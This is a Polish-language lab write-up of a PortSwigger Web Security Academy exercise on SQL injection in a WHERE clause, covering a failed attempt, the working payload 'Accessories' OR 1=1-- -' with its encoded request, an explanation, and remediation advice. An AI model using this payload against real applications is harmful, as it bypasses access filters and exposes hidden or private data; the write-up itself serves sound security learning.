# SQL Injection w WHERE Clause - Ukryte dane

> Platforma: PortSwigger Web Security Academy  
> Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
> Status: Ukończony  
> Cel: Prywatne notatki AppSec, nie pełny walkthrough.

## TL;DR

Filtr kategorii produktów był podatny, ponieważ parametr `category` był najprawdopodobniej wstawiany bezpośrednio do klauzuli SQL `WHERE`. Zmieniając logikę zapytania, można było ominąć warunek `released = 1` i wyświetlić ukryte produkty.

## Co ćwiczyłem

Testowałem filtr kategorii, który był używany do zwracania produktów z bazy danych.

Opis labu pokazywał, że backendowe zapytanie wyglądało podobnie do:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

Celem było sprawienie, aby aplikacja pokazała jeden lub więcej produktów, które nie były jeszcze opublikowane.

## Input, który kontrolowałem

Kontrolowanym inputem był parametr query `category`:

```http
GET /filter?category=Accessories HTTP/2
```

To prawdopodobnie trafiało do zapytania SQL podobnego do:

```sql
SELECT * FROM products
WHERE category = 'Accessories'
AND released = 1;
```

## Pierwsza obserwacja

Request do strony głównej nie miał oczywistego parametru do modyfikacji:

```http
GET / HTTP/2
```

Po wybraniu kategorii aplikacja wysłała bardziej interesujący request:

```http
GET /filter?category=Accessories HTTP/2
```

To wyglądało jak właściwy punkt wejścia, ponieważ opis labu wspominał o filtrze kategorii.

## Niepoprawna próba

Najpierw spróbowałem dodać tekst wyglądający jak SQL bez zamknięcia stringa:

```text
Gifts AND released = 0
```

Strona wyświetliła:

```text
Gifts AND released = 0
```

Na początku wyglądało to ciekawie, ale nie oznaczało, że warunek SQL został wykonany.

Najprawdopodobniej aplikacja traktowała całą wartość jako nazwę kategorii:

```sql
WHERE category = 'Gifts AND released = 0'
AND released = 1;
```

Ponieważ nie zamknąłem oryginalnego stringa apostrofem, mój input nadal znajdował się wewnątrz wartości kategorii.

## Działający payload

Payload, który rozwiązał lab:

```text
Accessories' OR 1=1-- -
```

Wersja URL encoded:

```text
Accessories%27%20OR%201=1--%20-
```

Pełna ścieżka:

```http
GET /filter?category=Accessories%27%20OR%201=1--%20- HTTP/2
```

## Dlaczego to zadziałało

Apostrof zamknął oryginalny string kategorii:

```sql
category = 'Accessories'
```

Następnie został dodany warunek:

```sql
OR 1=1
```

Ponieważ `1=1` zawsze jest prawdą, klauzula `WHERE` dopasowała więcej rekordów.

Sekwencja komentarza:

```sql
-- -
```

zakomentowała resztę oryginalnego zapytania, w tym:

```sql
AND released = 1
```

To pozwoliło aplikacji zwrócić produkty, które normalnie były ukryte.

## Wpływ

W prawdziwej aplikacji taki błąd mógłby pozwolić użytkownikowi ominąć filtry i zobaczyć dane, które nie powinny być widoczne.

W zależności od zapytania mogłyby to być:

- nieopublikowane produkty;
- ukryte treści;
- prywatne rekordy;
- dane wewnętrzne;
- dane należące do innych użytkowników.

## Remediacja dla developera

Aplikacja powinna używać parameterized queries / prepared statements zamiast bezpośrednio wstawiać wartości kontrolowane przez użytkownika do SQL.

Zalecane poprawki:

- używać prepared statements;
- unikać konkatenacji stringów w zapytaniach SQL;
- walidować wartości kategorii przez allowlistę;
- egzekwować reguły biznesowe po stronie serwera;
- testować filtry przez zmodyfikowane requesty, nie tylko normalne użycie UI.

Samo filtrowanie apostrofów nie jest poprawną główną naprawą. Główna poprawka to oddzielenie logiki SQL od danych użytkownika.

## Checklist do review

- Czy wartość filtra jest bezpośrednio wstawiana do klauzuli SQL `WHERE`?
- Czy użytkownik może zamknąć oryginalny kontekst stringa?
- Czy użytkownik może dodać warunki `OR`?
- Czy ukryte rekordy pojawiają się po modyfikacji filtrów?
- Czy reguła `released` / widoczności jest bezpiecznie egzekwowana?

## Najważniejsza lekcja

Tekst wyglądający jak SQL staje się logiką SQL dopiero wtedy, gdy wyjdzie z oryginalnego kontekstu zapytania. W tym labie kluczowe było zamknięcie stringa apostrofem, zmiana logiki `WHERE` i zakomentowanie oryginalnego filtra widoczności.
